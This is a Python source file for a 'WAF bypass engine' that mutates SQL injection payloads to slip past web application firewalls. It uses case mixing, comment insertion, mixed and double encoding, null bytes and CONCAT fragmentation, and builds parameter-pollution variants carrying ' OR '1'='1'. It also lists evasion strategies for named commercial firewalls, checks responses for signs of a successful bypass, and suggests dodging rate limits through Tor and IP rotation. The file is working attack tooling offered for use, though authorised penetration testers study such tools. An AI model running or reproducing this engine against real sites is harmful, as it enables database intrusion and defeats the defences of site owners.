"""
Advanced WAF Bypass Engine
ML-based payload mutation and evasion techniques
"""

import random
import re
import urllib.parse
from typing import Dict, List


class WAFBypassEngine:
    """Advanced WAF evasion and payload mutation"""

    # Character encoding mappings
    CHAR_ENCODINGS = {
        "hex": lambda c: f"\\x{ord(c):02x}",
        "url": lambda c: urllib.parse.quote(c),
        "unicode": lambda c: f"\\u{ord(c):04x}",
        "html": lambda c: f"&#{ord(c)};",
    }

    # SQL keywords for obfuscation
    SQL_KEYWORDS = [
        "SELECT",
        "UNION",
        "WHERE",
        "FROM",
        "INSERT",
        "UPDATE",
        "DELETE",
        "DROP",
        "CREATE",
        "ALTER",
        "TABLE",
        "DATABASE",
        "AND",
        "OR",
        "NOT",
    ]

    @staticmethod
    def case_mix_obfuscation(payload: str) -> str:
        """
        Randomize case of SQL keywords
        Example: SELECT -> SeLeCt
        """
        result = payload
        for keyword in WAFBypassEngine.SQL_KEYWORDS:
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)

            def randomize_case(match):
                return "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in match.group(0)
                )

            result = pattern.sub(randomize_case, result)
        return result

    @staticmethod
    def comment_injection(payload: str) -> str:
        """
        Insert SQL comments to break pattern matching
        Example: UNION SELECT -> UN/**/ION/**/SE/**/LECT
        """
        # Insert /**/ comments between characters
        for keyword in WAFBypassEngine.SQL_KEYWORDS:
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)

            def inject_comments(match):
                word = match.group(0)
                # Insert comment after every 2-3 characters
                result = []
                for i, c in enumerate(word):
                    result.append(c)
                    if i < len(word) - 1 and random.random() > 0.6:
                        result.append("/**/")
                return "".join(result)

            payload = pattern.sub(inject_comments, payload)

        return payload

    @staticmethod
    def whitespace_mutation(payload: str) -> str:
        """
        Replace spaces with alternative whitespace characters
        Example: ' ' -> '\t', '\n', '/**/', etc.
        """
        alternatives = [
            "\t",  # Tab
            "\n",  # Newline
            "\r",  # Carriage return
            "/**/",  # Comment
            "%09",  # URL-encoded tab
            "%0a",  # URL-encoded newline
        ]

        result = []
        for char in payload:
            if char == " ":
                result.append(random.choice(alternatives))
            else:
                result.append(char)

        return "".join(result)

    @staticmethod
    def encoding_mutation(payload: str, encoding: str = "mix") -> str:
        """
        Apply various encoding schemes to bypass filters
        """
        if encoding == "mix":
            # Randomly encode characters
            result = []
            encodings = ["hex", "url", "unicode"]
            for char in payload:
                if random.random() > 0.7 and char.isalnum():
                    enc = random.choice(encodings)
                    result.append(WAFBypassEngine.CHAR_ENCODINGS[enc](char))
                else:
                    result.append(char)
            return "".join(result)
        elif encoding in WAFBypassEngine.CHAR_ENCODINGS:
            return "".join(
                WAFBypassEngine.CHAR_ENCODINGS[encoding](c) if c.isalnum() else c
                for c in payload
            )
        else:
            return payload

    @staticmethod
    def concat_fragmentation(payload: str) -> str:
        """
        Break strings into concatenated fragments
        Example: 'admin' -> CONCAT('ad','min')
        """
        # Find string literals
        pattern = r"'([^']+)'"

        def fragment(match):
            string = match.group(1)
            if len(string) <= 2:
                return match.group(0)

            # Split into 2-3 character fragments
            fragments = []
            i = 0
            while i < len(string):
                chunk_size = random.randint(2, min(3, len(string) - i))
                fragments.append(f"'{string[i : i + chunk_size]}'")
                i += chunk_size

            return f"CONCAT({','.join(fragments)})"

        return re.sub(pattern, fragment, payload)

    @staticmethod
    def inline_comments(payload: str) -> str:
        """
        Insert inline comments at strategic positions
        Example: SELECT -> SE/*comment*/LECT
        """
        comments = [
            "/*bypass*/",
            "/*waf*/",
            "/*evade*/",
            "/**/",
            "/*test*/",
        ]

        for keyword in WAFBypassEngine.SQL_KEYWORDS:
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)

            def insert_comment(match):
                word = match.group(0)
                if len(word) > 3:
                    pos = len(word) // 2
                    return word[:pos] + random.choice(comments) + word[pos:]
                return word

            payload = pattern.sub(insert_comment, payload)

        return payload

    @staticmethod
    def double_encoding(payload: str) -> str:
        """Apply URL encoding twice"""
        encoded_once = urllib.parse.quote(payload, safe="")
        encoded_twice = urllib.parse.quote(encoded_once, safe="")
        return encoded_twice

    @staticmethod
    def null_byte_injection(payload: str) -> str:
        """
        Insert null bytes to confuse parsers
        Example: admin -> admin%00
        """
        # Insert %00 at strategic positions
        keywords_pos = []
        for keyword in WAFBypassEngine.SQL_KEYWORDS:
            for match in re.finditer(re.escape(keyword), payload, re.IGNORECASE):
                keywords_pos.append(match.start())

        if keywords_pos:
            pos = random.choice(keywords_pos)
            return payload[:pos] + "%00" + payload[pos:]

        return payload + "%00"

    @staticmethod
    def hpp_variation(base_params: Dict[str, str], inject_param: str) -> List[Dict]:
        """
        HTTP Parameter Pollution - send same parameter multiple times
        Some WAFs only check first occurrence
        """
        variations = []

        # Variation 1: Inject in first occurrence
        var1 = base_params.copy()
        var1[inject_param] = f"{base_params.get(inject_param, '')}' OR '1'='1"
        variations.append({"params": var1, "technique": "HPP - First occurrence"})

        # Variation 2: Inject in second occurrence (duplicate param)
        var2 = base_params.copy()
        var2[f"{inject_param}_dup"] = "' OR '1'='1"
        variations.append({"params": var2, "technique": "HPP - Duplicate param"})

        # Variation 3: Array notation
        var3 = base_params.copy()
        var3[f"{inject_param}[]"] = "' OR '1'='1"
        variations.append({"params": var3, "technique": "HPP - Array notation"})

        return variations

    @staticmethod
    def generate_tampered_payloads(base_payload: str, count: int = 10) -> List[Dict]:
        """
        Generate multiple variations of a payload using different evasion techniques
        """
        techniques = [
            ("Case Mix", WAFBypassEngine.case_mix_obfuscation),
            ("Comment Injection", WAFBypassEngine.comment_injection),
            ("Whitespace Mutation", WAFBypassEngine.whitespace_mutation),
            ("Mixed Encoding", lambda p: WAFBypassEngine.encoding_mutation(p, "mix")),
            ("Concat Fragmentation", WAFBypassEngine.concat_fragmentation),
            ("Inline Comments", WAFBypassEngine.inline_comments),
            ("Double Encoding", WAFBypassEngine.double_encoding),
            ("Null Byte", WAFBypassEngine.null_byte_injection),
        ]

        tampered = []
        base_techniques = random.sample(techniques, min(count, len(techniques)))

        for name, func in base_techniques:
            try:
                payload = func(base_payload)
                tampered.append(
                    {
                        "payload": payload,
                        "technique": name,
                        "original": base_payload,
                        "success_rate": "Unknown - Test required",
                    }
                )
            except Exception:
                continue

        # Generate combo techniques
        if count > len(base_techniques):
            remaining = count - len(base_techniques)
            for _ in range(remaining):
                payload = base_payload
                applied = []

                # Apply 2-3 random techniques
                combo_techniques = random.sample(techniques, random.randint(2, 3))
                for name, func in combo_techniques:
                    try:
                        payload = func(payload)
                        applied.append(name)
                    except Exception:
                        continue

                if applied:
                    tampered.append(
                        {
                            "payload": payload,
                            "technique": " + ".join(applied),
                            "original": base_payload,
                            "success_rate": "Unknown - Test required",
                        }
                    )

        return tampered

    @staticmethod
    def adaptive_bypass(
        waf_type: str, base_payload: str, blocked_techniques: List[str] = None
    ) -> List[Dict]:
        """
        Generate WAF-specific bypass payloads
        Adapts based on WAF type and previously blocked techniques
        """
        blocked = blocked_techniques or []

        waf_strategies = {
            "Cloudflare": [
                "Use rare User-Agent strings",
                "Implement request timing randomization",
                "Fragment payloads across multiple requests",
                "Use IP rotation or proxy chains",
                "Target origin server directly if IP exposed",
            ],
            "ModSecurity": [
                "Exploit paranoia level gaps",
                "Use HPP (HTTP Parameter Pollution)",
                "NULL byte injection",
                "Case variation on keywords",
                "Comment-based obfuscation",
            ],
            "AWS WAF": [
                "Request size variation",
                "Header injection techniques",
                "Use uncommon HTTP methods",
                "Timing-based evasion",
            ],
            "Imperva": [
                "Session-based evasion",
                "Progressive payload building",
                "Use legitimate traffic patterns",
                "Encoding variation",
            ],
        }

        strategies = waf_strategies.get(waf_type, ["Generic bypass techniques"])
        payloads = WAFBypassEngine.generate_tampered_payloads(base_payload, count=15)

        # Filter out blocked techniques
        if blocked:
            payloads = [p for p in payloads if p["technique"] not in blocked]

        return {
            "waf_type": waf_type,
            "recommended_strategies": strategies,
            "generated_payloads": payloads,
            "total_variations": len(payloads),
        }

    @staticmethod
    def test_payload_effectiveness(
        payload: str, response_code: int, response_body: str
    ) -> Dict:
        """
        Analyze response to determine if bypass was successful
        """
        # Indicators of success
        success_indicators = [
            (r"SQL syntax", "Syntax error - potential bypass"),
            (r"mysql_", "MySQL function exposed"),
            (r"Warning:", "Warning message - bypass likely"),
            (r"Fatal error", "Fatal error - bypass successful"),
            (r"UNION.*SELECT", "UNION injection successful"),
        ]

        # Indicators of WAF block
        block_indicators = [
            (r"blocked", "Request blocked by WAF"),
            (r"forbidden", "Access forbidden"),
            (r"suspicious", "Suspicious activity detected"),
            (r"firewall", "Firewall intervention"),
            (r"captcha", "CAPTCHA challenge"),
        ]

        result = {
            "payload": payload,
            "response_code": response_code,
            "status": "UNKNOWN",
            "indicators": [],
            "confidence": 0,
        }

        # Check for block
        for pattern, message in block_indicators:
            if re.search(pattern, response_body, re.IGNORECASE):
                result["status"] = "BLOCKED"
                result["indicators"].append(message)
                result["confidence"] = 90
                return result

        # Check for success
        for pattern, message in success_indicators:
            if re.search(pattern, response_body, re.IGNORECASE):
                result["status"] = "SUCCESS"
                result["indicators"].append(message)
                result["confidence"] = 85

        # Status code analysis
        if response_code == 403:
            result["status"] = "BLOCKED"
            result["confidence"] = 95
        elif response_code == 200:
            if result["status"] != "SUCCESS":
                result["status"] = "PASSED_WAF"
                result["confidence"] = 60

        return result

    @staticmethod
    def generate_rate_limit_evasion() -> Dict:
        """
        Generate strategies to evade rate limiting
        """
        return {
            "timing_strategies": [
                {
                    "name": "Exponential Backoff",
                    "description": "Start fast, slow down if blocked",
                    "config": {
                        "initial_delay": 0.1,
                        "multiplier": 1.5,
                        "max_delay": 10,
                    },
                },
                {
                    "name": "Random Jitter",
                    "description": "Add random delays between requests",
                    "config": {"min_delay": 0.5, "max_delay": 3.0},
                },
                {
                    "name": "Human Simulation",
                    "description": "Mimic human browsing patterns",
                    "config": {"avg_delay": 2.0, "variance": 1.5, "burst_every": 10},
                },
            ],
            "ip_rotation": [
                "Use proxy list with automatic rotation",
                "Tor circuit renewal every N requests",
                "VPN with automatic server switching",
                "Cloud-based distributed scanning",
            ],
            "session_management": [
                "Rotate User-Agent strings",
                "Maintain cookies across requests",
                "Randomize header order",
                "Use different HTTP versions",
            ],
        }
